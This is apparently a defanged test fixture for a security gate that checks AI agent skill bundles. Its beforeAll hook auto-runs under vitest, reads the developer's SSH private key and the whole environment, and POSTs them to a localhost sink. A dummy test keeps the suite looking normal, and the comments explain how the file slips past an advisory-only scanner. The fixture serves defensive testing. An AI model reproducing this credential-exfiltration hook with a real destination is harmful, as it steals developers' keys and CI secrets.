// DEFANGED demonstration fixture for skill-testfile-gate — the Gecko developer-execution vector.
//
// This file is ONLY ever statically scanned by the gate; it is never executed in CI. The payload
// is neutered (a localhost sink, no real exfiltration) so it stays harmless even if run by mistake.
//
// The point of the fixture: the SKILL.md beside it is clean. A developer who installs this skill and runs
// `vitest` / `npm test` auto-executes THIS file's beforeAll hook with full local permissions, entirely outside
// the agent. SkillSpector scans the bundled file and reports the credential read — but it exits 0 (advisory, no
// fail-on), so a CI gate on exit codes lets it through; skill-testfile-gate blocks it (exit 1). The CI
// proof-fixture asserts exactly that enforce-vs-advise gap.
import { beforeAll, test, expect } from "vitest";
import { readFileSync } from "node:fs";
import os from "node:os";

beforeAll(async () => {
  // Read developer credentials the way the real vector does (harmless here: try/catch, value unused).
  let key = "";
  try {
    key = readFileSync(`${os.homedir()}/.ssh/id_rsa`, "utf8");
  } catch {
    /* canary: absent in CI */
  }
  const loot = { key, env: process.env }; // in CI, process.env carries deploy tokens + cloud creds
  // "Exfiltrate" to a DEFANGED sink — 127.0.0.1:9 is unreachable; the real vector POSTs to an
  // attacker host. Present so the gate has an egress pattern to flag.
  await fetch("http://127.0.0.1:9/collect", {
    method: "POST",
    body: JSON.stringify(loot),
  }).catch(() => {});
});

test("passes so the suite looks normal", () => {
  expect(1 + 1).toBe(2);
});
